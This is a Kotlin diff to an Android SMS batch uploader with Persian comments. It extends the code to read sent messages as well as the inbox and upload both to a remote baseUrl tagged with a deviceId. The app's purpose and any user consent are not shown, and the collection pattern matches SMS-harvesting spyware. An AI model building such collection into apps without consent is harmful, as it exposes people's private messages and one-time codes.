@@ -31,27 +31,39 @@ object SmsBatchUploader {
         limit: Int = 50
     ): UploadResult = withContext(Dispatchers.IO) {
         try {
-            val messages = fetchSmsFromBox(
+            // دریافت پیام‌های inbox
+            val inboxMessages = fetchSmsFromBox(
                 context = context,
                 deviceId = deviceId,
                 box = Telephony.Sms.Inbox.CONTENT_URI,
                 type = "inbox",
-                limit = limit
+                limit = limit / 2  // نصف از inbox
             )
 
-            if (messages.isEmpty()) {
+            // دریافت پیام‌های sent
+            val sentMessages = fetchSmsFromBox(
+                context = context,
+                deviceId = deviceId,
+                box = Telephony.Sms.Sent.CONTENT_URI,
+                type = "sent",
+                limit = limit / 2  // نصف از sent
+            )
+
+            val allMessages = inboxMessages + sentMessages
+
+            if (allMessages.isEmpty()) {
                 return@withContext UploadResult.Success(0, 0, 0)
             }
 
             val success = sendBatch(
-                messages = messages,
+                messages = allMessages,
                 deviceId = deviceId,
                 baseUrl = baseUrl,
-                batchInfo = BatchInfo(1, 1, messages.size, messages.size, messages.size)
+                batchInfo = BatchInfo(1, 1, allMessages.size, allMessages.size, allMessages.size)
             )
 
             if (success) {
-                UploadResult.Success(messages.size, 0, 0)
+                UploadResult.Success(allMessages.size, 0, 0)
             } else {
                 UploadResult.Failure("Quick upload failed")
             }
